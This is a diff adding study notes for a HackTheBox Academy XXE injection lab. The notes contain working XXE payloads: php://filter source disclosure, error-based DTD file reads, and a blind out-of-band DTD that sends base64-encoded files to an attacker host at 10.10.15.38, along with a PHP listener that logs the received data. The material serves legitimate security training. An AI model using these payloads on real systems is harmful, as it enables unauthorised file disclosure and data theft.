@@ -60,6 +60,17 @@ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
 >[Intro to XXE Injections](https://academy.hackthebox.com/module/134/section/1203)  
 >[BSCP XXE Notes](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/README.md#xxe-injections)  
 
+### Identify XXE  
+
+>By adding the below XML code to the POST request in the XML body, and then calling the entity, `&fuzzer;` in field value.
+>If reflected or executed blind then positively identified XXE.  
+
+```xml
+<!DOCTYPE email [
+  <!ENTITY fuzzer "Inlane Freight">
+]>
+```  
+  
 | **Code**   | **Description**   |
 | --------------|-------------------|
 | `<!ENTITY xxe SYSTEM "http://localhost/email.dtd">` | Define External Entity to a URL |
@@ -122,4 +133,100 @@ Cookie: role=employee
  "uid":"10","uuid":"bfd92386a1b48076792e68b596846499","role":"staff_admin","full_name":"admin","email":"flag@idor.htb","about":"Never gonna give you up, Never gonna let you down"
 }
 ```  
+
+>[Local File Disclosure and source code](https://academy.hackthebox.com/module/134/section/1204) - Read the source code content of the 'connection.php' file, and submit the value of the 'api_key' as the answer.  
+
+![xxe identify](/images/xxe-identify.png)  
+
+>Insert the following XML code:  
+
+``xml
+<!DOCTYPE email [
+  <!ENTITY fuzzer SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
+]>
+```  
+
+>Add the following entity in the email field that is reflected and print the base64 encode source code of the `connection.php` file.  
+
+![xxe-reading-source-code](/images/xxe-reading-source-code.png)  
+
+>[Advanced File Disclosure](https://academy.hackthebox.com/module/134/section/1206) - Use either XXE methods to read the flag at `/flag.php`.
+>Options - use the CDATA method at '/index.php', or the error-based method at `/error`).  
+
+>Error Based XXE, but entering invalid entity value, and then the response reveal the server web folder path as, `/var/www/html/error/submitDetails.php`.
+
+>Host `error.dtd` on Kali http web server.
+
+```XML
+<!ENTITY % file SYSTEM "file:///flag.php">
+<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+```  
+
+![xxe-error-based-source](/images/xxe-error-based-source.png)  
+
+>The request to the back end server with the below xml code header doctype section, and calling a incorrect entity `&nonExistingEntity;`:  
+
+```xml
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://10.10.15.38:8000/error.dtd">
+  %remote;
+  %error;
+]>
+```
+
+>Using Blind Data Exfiltration on the `/blind` page to read the content of `/327a6c4304ad5938eaf0efb6cc3e53dc.php` and get the flag.  
+>[DTD Blind Out-of-band](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/README.md#dtd-blind-out-of-band) BSCP Notes.  
+
+>blind.dtd  
+
+```xml
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.15.38:80/?content=%file;'>">
+```  
+
+>index.php  
+
+```php               
+<?php
+if(isset($_GET['content'])){
+    error_log("\n\n" . base64_decode($_GET['content']));
+}
+?>
+```  
+
+<Hosting XML DTD Exploit server to receive incoming blind response from target contain base64 file string.  
+
+```
+php -S 0.0.0.0:80
+```  
+
+>Request with XXE payload:  
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://10.10.15.38:80/blind.dtd">
+  %remote;
+  %oob;
+]>
+<root>
+ &content;
+ </root>
+```
+
+>Burp Suite Request
+
+![HTB xxe-dtd-blind-error-messages](/images/xxe-dtd-blind-error-messages.png)  
+
+# Web Attacks - Skills Assessment  
+
+>[Scenario](https://academy.hackthebox.com/module/134/section/1219) You are performing a web application penetration test for a software development company, and they task you with testing the latest build of their social networking web application. 
+>The login details are provided to `94.237.49.11` with user `htb-student` and password `Academy_student!`.  
+
+![web-attack-skills-assessment](/images/web-attack-skills-assessment.png)  
+
+
+
+
+
 
